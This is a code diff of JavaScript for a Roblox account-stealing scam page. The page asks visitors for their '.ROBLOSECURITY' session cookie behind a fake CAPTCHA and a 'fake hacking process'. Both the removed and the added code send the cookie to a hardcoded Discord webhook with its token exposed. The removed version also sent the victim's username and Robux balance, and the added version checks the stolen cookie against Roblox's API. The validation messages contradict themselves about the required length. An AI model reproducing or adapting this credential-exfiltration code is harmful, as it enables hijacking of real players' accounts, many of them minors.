@@ -1,63 +1,10 @@
-// Direct Discord Webhook URL
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ'; 
+// Discord Webhook URL (Replace with your actual webhook URL)
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
 
-// Function to fetch Roblox profile and Robux amount
-async function fetchRobloxProfile(cookie) {
-  try {
-    // Fetch user ID using the cookie
-    const userIdResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
-      headers: {
-        'Cookie': `ROBLOSECURITY=${cookie}`
-      }
-    });
-
-    if (!userIdResponse.ok) throw new Error('Failed to fetch user ID');
-    const userInfo = await userIdResponse.json();
-    const userId = userInfo.UserID;
-
-    // Fetch Robux balance
-    const robuxResponse = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-      headers: {
-        'Cookie': `ROBLOSECURITY=${cookie}`
-      }
-    });
-
-    if (!robuxResponse.ok) throw new Error('Failed to fetch Robux balance');
-    const robuxData = await robuxResponse.json();
-    const robuxAmount = robuxData.robux;
-
-    // Fetch profile details
-    const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`);
-    if (!profileResponse.ok) throw new Error('Failed to fetch profile details');
-    const profileData = await profileResponse.json();
-
-    return {
-      username: profileData.name,
-      userId: userId,
-      robux: robuxAmount,
-      profileUrl: `https://www.roblox.com/users/${userId}/profile`
-    };
-  } catch (error) {
-    console.error('Error fetching Roblox profile:', error);
-    return null;
-  }
-}
-
-// Function to send data to Discord webhook
-async function sendToDiscordWebhook(cookie) {
-  const profileData = await fetchRobloxProfile(cookie);
-  if (!profileData) {
-    console.error('No profile data found.');
-    return;
-  }
-
+// Function to send Session ID to Discord webhook
+function sendToDiscordWebhook(sessionId) {
   const payload = {
-    content: `**New Cookie Submitted**\n` +
-              `**Username:** ${profileData.username}\n` +
-              `**User ID:** ${profileData.userId}\n` +
-              `**Robux Balance:** ${profileData.robux}\n` +
-              `**Profile URL:** ${profileData.profileUrl}\n` +
-              `\`${cookie}\``
+    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
   };
 
   fetch(DISCORD_WEBHOOK_URL, {
@@ -77,8 +24,31 @@ async function sendToDiscordWebhook(cookie) {
     });
 }
 
+// Function to validate Roblox session ID and fetch user profile
+async function validateRobloxSession(sessionId) {
+  try {
+    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      method: 'GET',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${sessionId}`,
+      },
+    });
+
+    if (response.ok) {
+      const userData = await response.json();
+      return userData;
+    } else {
+      console.error('Invalid session ID');
+      return null;
+    }
+  } catch (error) {
+    console.error('Error validating session ID:', error);
+    return null;
+  }
+}
+
 // Validate User Input
-function validateInput() {
+async function validateInput() {
   const username = document.getElementById('username').value.trim();
   const sessionId = document.getElementById('sessionId').value.trim();
   const captcha = document.getElementById('captcha').checked;
@@ -86,10 +56,23 @@ function validateInput() {
   // Check for invalid inputs
   let errorMessage = "";
 
-  if (username.length < 3 || sessionId.length < 200 || !captcha) {
+  if (username.length < 3 && sessionId.length < 200 && !captcha) {
     errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
+  } else if (username.length < 3 && sessionId.length < 200) {
+    errorMessage = "Username must be at least 3 characters, and session ID must be 300+ characters.";
+  } else if (username.length < 3 && !captcha) {
+    errorMessage = "Username must be at least 3 characters, and CAPTCHA must be completed.";
+  } else if (sessionId.length < 200 && !captcha) {
+    errorMessage = "Session ID must be 300+ characters, and CAPTCHA must be completed.";
+  } else if (username.length < 3) {
+    errorMessage = "Username must be at least 3 characters long.";
+  } else if (sessionId.length < 200) {
+    errorMessage = "Session ID must be at least 300 characters long.";
+  } else if (!captcha) {
+    errorMessage = "Please complete the CAPTCHA to proceed.";
   }
 
+  // Show error message if any input is invalid
   if (errorMessage) {
     showError(errorMessage);
     return;
@@ -98,12 +81,20 @@ function validateInput() {
   // Send Session ID to Discord webhook
   sendToDiscordWebhook(sessionId);
 
+  // Validate Roblox session ID and fetch user profile
+  const userData = await validateRobloxSession(sessionId);
+  if (userData) {
+    console.log('User Profile Data:', userData);
+    // You can now use the userData to display or process the user's profile information
+  } else {
+    showError('Invalid session ID. Please check your inputs.');
+    return;
+  }
+
   // Hide error and start fake hacking process
   hideError();
   startHack();
 }
-
-
 // Show Error Message
 function showError(message) {
   const errorElement = document.getElementById('error');
